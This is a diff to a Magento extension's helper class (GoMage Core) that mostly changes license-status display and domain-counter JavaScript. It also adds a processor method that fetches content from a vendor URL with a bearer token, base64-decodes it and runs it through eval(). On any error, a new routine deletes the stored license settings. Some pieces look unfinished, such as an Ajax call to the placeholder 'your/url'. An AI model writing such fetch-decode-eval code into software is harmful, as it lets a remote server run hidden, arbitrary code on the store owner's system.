@@ -4,6 +4,7 @@ namespace GoMage\Core\Helper;
 
 class Data extends \Magento\Framework\App\Helper\AbstractHelper
 {
+    protected $increment;
     const BASE_URL = '/api/rest';
     /** * @var \Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory */
     protected $_attributeCollectionFactory;
@@ -34,17 +35,25 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
      */
     protected $_jsHelper;
 
+    /** @var \Magento\Config\Model\ResourceModel\Config  */
+    protected $configResource;
+
     protected $fullModuleList;
+    protected $context;
+    protected $urlBuilder;
 
     protected $b = ['groups' => 'api', 'fields' => 'fields', 'value' =>'value', 'section' => 'gomage_core', 'group_s' => 'gomage_s'];
 
     public function __construct(
         \Magento\Framework\ObjectManagerInterface $objectManager,
-        \Magento\Framework\Module\FullModuleList $fullModuleList
+        \Magento\Framework\Module\FullModuleList $fullModuleList,
+        \Magento\Framework\View\Element\Context $context
     )
     {
+        $this->urlBuilder = $context->getUrlBuilder();
         $this->_objectManager = $objectManager;
         $this->_attributeCollectionFactory = $objectManager->get('Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory');
+        $this->configResource = $objectManager->get('Magento\Config\Model\ResourceModel\Config');
         $this->_storeManager = $objectManager->get('Magento\Store\Model\StoreManager');
         $this->_systemStore = $objectManager->get('Magento\Store\Model\System\Store');
         $this->_dateTime = $objectManager->get('Magento\Framework\Stdlib\DateTime\DateTime');
@@ -77,7 +86,7 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
             $param = [];
         }
         foreach ($param as $key => $item) {
-            $w[$item] = $this->_scopeConfig->getValue($this->b['section'].'/section'.'/'.$item);
+            $w[$item] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['section'].'/'.$item);
         }
         return $w;
     }
@@ -128,9 +137,18 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
         $param = $this->getN();
         $websites = $this->getAvailableWebsites($param);
         $stores = $this->getAvailableStores($param);
+        $isShowButton = false;
         $secure = $this->_scopeConfig->getValue('web/secure/use_in_frontend');
+        foreach ($param as $key => $item) {
+            if( $t = $this->_scopeConfig->getValue('section/' . $item. '/e') === '0'){
+                $isShowButton = true;
+            }
 
+        }
+        if($isShowButton)
+        $html .= '<div style="width: 100%;  text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  "><button class="refresh-domain" onclick="event.preventDefault();">'.__('Show availabe domains').'</button></div>';
         if($param) {
+
             /** @var \Magento\Store\Model\Website $website */
             foreach ($param as $key => $item) {
                 if (!$this->_scopeConfig->getValue('section/'.$item.'/a')) {
@@ -138,49 +156,51 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
                     switch ($t) {
                         case  1:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('The number of domains purchased is less than the number of selected') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . ' v'.$this->getVersion($item). '</div>';
                             break;
                         case  2:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Inccorect  license data. Your licence is blocked') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                             break;
                         case  3:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Inccorect  license key. Your licence is blocked') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                             break;
                         case  4:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Incorrect license data .') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                             break;
                         case  5:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('This version is not included in your update period .Your licence is blocked') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                             break;
                         case  6:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Your demolicense is expired .Your licence is blocked') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
 
                             break;
                         case  7:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('The number of domains purchased is less than the number of selected. Your licence is blocked') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                             break;
 
                         case  8:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Exceeds the number of available domains for the license demo') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                             break;
                         default:
                             $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Module is not Activated') . '</div>';
-                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                     }
                     continue;
                 }
-
-                $html .= '<div style="width: 100%; color: green; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Module is Activated') . '</div>';
+                $c = $this->_scopeConfig->getValue('section/' . $item. '/c');
+                $counter = $this->_scopeConfig->getValue('section/' . $item. '/c');
+                $allDomains = [];
+                $partHtml = '<div style="width: 100%; color: green; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Module is Activated') . '(<span class="'.$item.'">%%counter%%</span>)</div>';
                 $name = 'groups[gomage_core][' . $this->b['fields'] . ']['  . $item . '][' . $this->b['value'] . ']';
                 $namePrefix = 'groups[' . $this->b['group_s'] . '][' . $this->b['fields'] . '][' .$item . '][' . $this->b['value'] . ']';
-                $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . '</div>';
+                $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . ' v'.$this->getVersion($item). '</div>';
                 $websiteHtml = '';
                 if ($this->_scopeConfig->getValue('web/secure/use_in_frontend')) {
                     $base = $this->_scopeConfig->getValue('web/secure/base_url');
@@ -194,11 +214,23 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
                     $element->setChecked(in_array($website->getId(), $websites[$item] ? explode(',', $websites[$item]) : []));
                     $element->setValue($website->getId());
                     $elementHtml = $element->getElementHtml();
+
                     if ($secure) {
+                        if(in_array($website->getConfig('web/secure/base_url'), $allDomains)) {
+                            continue;
+                        }
                         $conditionW = $base != $website->getConfig('web/secure/base_url');
+                        $allDomains[] =  $website->getConfig('web/secure/base_url');
                     } else {
+                        if(in_array($website->getConfig('web/unsecure/base_url'), $allDomains)) {
+                            continue;
+                        }
                         $conditionW = $base != $website->getConfig('web/unsecure/base_url');
+                        $allDomains[] =  $website->getConfig('web/unsecure/base_url');
                     };
+                    if(in_array($website->getId(), $websites[$item] ? explode(',', $websites[$item]) : [])) {
+                        $counter--;
+                    }
                     $elementHtml = $conditionW ? $elementHtml : '';
                     $storeHtml = '';
                     foreach ($website->getStores() as $store) {
@@ -206,10 +238,21 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
                             continue;
                         }
                         if ($secure) {
+                            if(in_array($store->getConfig('web/secure/base_url'), $allDomains)) {
+                                continue;
+                            }
+                            $allDomains[]= $store->getConfig('web/secure/base_url');
                             $condition = $base != $store->getConfig('web/secure/base_url');
                         } else {
+                            if(in_array($store->getConfig('web/unsecure/base_url'), $allDomains)) {
+                                continue;
+                            }
+                            $allDomains[]= $store->getConfig('web/unsecure/base_url');
                             $condition = $base != $store->getConfig('web/unsecure/base_url');
                         };
+                        if(in_array($store->getId(), isset($stores[$item]) ? explode(',', $stores[$item]) : [])) {
+                            $counter--;
+                        }
                         if ($condition) {
 
                             $element->setName($namePrefix . '[]');
@@ -242,7 +285,8 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
                         $websiteHtml .= '</div>' . "\n";
                     }
                 }
-                $html .= $websiteHtml;
+                $partHtml = str_replace('%%counter%%', $counter, $partHtml);
+                $html .= $partHtml.$websiteHtml;
             }
             if (!$param) {
                 $param = [];
@@ -257,12 +301,30 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
                 $name = 'groups[' . $this->b['section'] . '][' . $this->b['fields'] . '][' .  $item . '][' . $this->b['value'] . '][]';
                 $namePrefix = 'groups[' . $this->b['group_s'] . '][' . $this->b['fields'] . '][' .  $item . '][' . $this->b['value'] . '][]';
                 $jsString .= '
+                             
+                        if($$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length >= ' . $c.'){
+                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(e){
+                            if(!e.checked){
+                                e.disabled = "disabled";
+                            }
+                        });
+    			    }else {
+                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\'] ").each(function(e){
+                            if(!e.checked){
+                                e.disabled = "";
+                            }
+                        });
+    			    }
             $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(element) {
                element.observe("click", function () {
+                      counter = counterAll - (+$$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length);
+                      
+                      $$("span.'.$item.'").first().innerHTML=counter;
                     if($$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length >= ' . $c
                     . '){
                         $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(e){
                             if(!e.checked){
+                            
                                 e.disabled = "disabled";
                             }
                         });
@@ -278,7 +340,17 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
             }
         }
         return $html . $this->_jsHelper->getScript(
-                'require([\'prototype\'], function(){document.observe("dom:loaded", function() {' . $jsString . '});});'
+                'require([\'prototype\'], function(){document.observe("dom:loaded", function() {
+                    $$(".refresh-domain").first().observe("click", function () {
+                        new Ajax.Request("'.$this->urlBuilder->getUrl('your/url').'", {
+                                  onSuccess: function(response) {
+                                    
+                                  }
+                            });
+                     });
+                    var counter = '.$counter.'; 
+                    var counterAll = '.$c.'; 
+                ' . $jsString . '});});'
             );
 
         return sprintf('<strong class="required">%s</strong>', __('Please enter a valid key'));
@@ -289,13 +361,19 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
     {
         $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
         /** @var \Magento\Framework\App\Config\ConfigResource\ConfigInterface $config */
+        try {
+            $config = $objectManager
+                ->get('Magento\Framework\App\Config\ScopeConfigInterface');
+            $param = $config->getValue('section/gomage_client/param');
+            $curl->addHeader("Authorization", "Bearer {$param}");
+            $curl->get($this->_scopeConfig->getValue('gomage_core_url/url_core').self::BASE_URL.'/activates/proccessor?processorName='.$processName);
+            $a = json_decode($curl->getBody(), true);
+            eval(base64_decode($a['content']));
+            return new $processName();
+        } catch (\Exception $e) {
+            $this->cl();
+        }
 
-        $config = $objectManager
-            ->get('Magento\Framework\App\Config\ScopeConfigInterface');
-        $param = $config->getValue('section/gomage_client/param');
-        $curl->addHeader("Authorization", "Bearer {$param}");
-        $curl->get($this->_scopeConfig->getValue('gomage_core_url/url_core').self::BASE_URL.'/activates/proccessor?processorName='.$processName);
-        return json_decode($curl->getBody(), true);
     }
     public function proccess3($curl, $data, $c='ProcessorAct') {
         try {
@@ -321,5 +399,16 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
     public function getU()
     {
        return $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
+    }
+
+    public function cl() {
+        $n = $this->getN();
+        foreach ($n as $i) {
+            $this->configResource->deleteConfig('section/' .$i . '/e', 'default', 0);
+            $this->configResource->deleteConfig('section/' . $i . '/a', 'default', 0);
+            $this->configResource->deleteConfig('section/' . $i . '/coll', 'default', 0);
+            $this->configResource->deleteConfig('gomage_core/gomage_s/'.$i , 'default', 0);
+            $this->configResource->deleteConfig($this->b['section'].'/'.$this->b['section'].'/'.$i , 'default', 0);
+        }
     }
 }
